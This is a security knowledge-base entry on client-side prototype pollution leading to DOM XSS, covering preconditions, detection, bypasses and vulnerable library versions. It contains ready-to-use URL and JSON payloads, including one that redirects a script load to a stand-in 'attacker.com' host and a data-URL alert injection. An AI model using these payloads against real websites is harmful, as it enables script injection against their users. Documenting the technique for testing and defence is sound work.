---
title: Client-side prototype pollution gadget exploitation
slug: client-side-pp-gadget
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/prototype-pollution, technique/dom-xss, sink/script-src]
inbound: []
---

# Client-side prototype pollution gadget exploitation

## Pattern

An attacker pollutes `Object.prototype` via a URL query string or JSON input, injecting a property (e.g. `transport_url`, `innerHTML`, `src`) that a later code path reads as a default or configuration value. The gadget — a piece of app or library code that reads a property from an object that may inherit from `Object.prototype` — delivers the polluted value to a dangerous sink (script load, innerHTML, eval), achieving XSS.

## Preconditions

- A deep-merge, clone, or recursive assignment function processes attacker-controlled input without sanitizing `__proto__`, `constructor.prototype`, or `prototype` keys.
- At least one gadget exists in the app's JS: code that reads an optional property from a plain object and uses it unsafely.
- The attacker can inject a URL query parameter or JSON body with bracket notation.

## Detection

- `js_analyzer` source: URL query params parsed by `qs.parse`, `URLSearchParams` with bracket notation, `JSON.parse` of body
- `js_analyzer` sink: `document.createElement('script').src = ...`, `innerHTML = config.x || ''`, `eval(options.callback)`
- Static grep: `__proto__` in query string handling; `_.merge(`, `_.defaultsDeep(`, `$.extend(true,` calls
- Runtime probe: set `?__proto__[test]=polluted` and check `({}).test` in console — should equal `"polluted"` if vulnerable

## Triggering

Basic pollution via URL query string (bracket notation):
```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

Script source hijacking gadget:
```
https://vulnerable-website.com/?__proto__[transport_url]=//attacker.com/evil.js
```

Data URL XSS via polluted `transport_url`:
```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

JSON body pollution (API endpoint):
```json
{ "__proto__": { "evilProperty": "payload" } }
```

`constructor` key bypass (when `__proto__` is blocked):
```
https://vulnerable-website.com/?constructor[prototype][evilProperty]=payload
```

## Bypasses

- `__proto__` sanitized → try `constructor.prototype` key: `?constructor[prototype][x]=y`
- Deep-merge only checks one level → try nesting: `?a[__proto__][x]=y` where `a` is an accepted key
- JSON-only surface: `{"__proto__": {"x": "y"}}` — `JSON.parse` creates literal key, merge step copies it up
- Libraries: lodash < 4.17.17, jquery < 3.4.0, `qs` < 6.7.3, `deep-extend` < 0.5.1 are known vulnerable

## Seen-in-the-wild

(none yet)

## References

- [PortSwigger Prototype pollution](../../sources/portswigger-prototype-pollution.md) — URL pollution + gadget example
- [Prototype Pollution SUMMARY](SUMMARY.md)
- [DOM XSS SUMMARY](../dom-xss/SUMMARY.md)
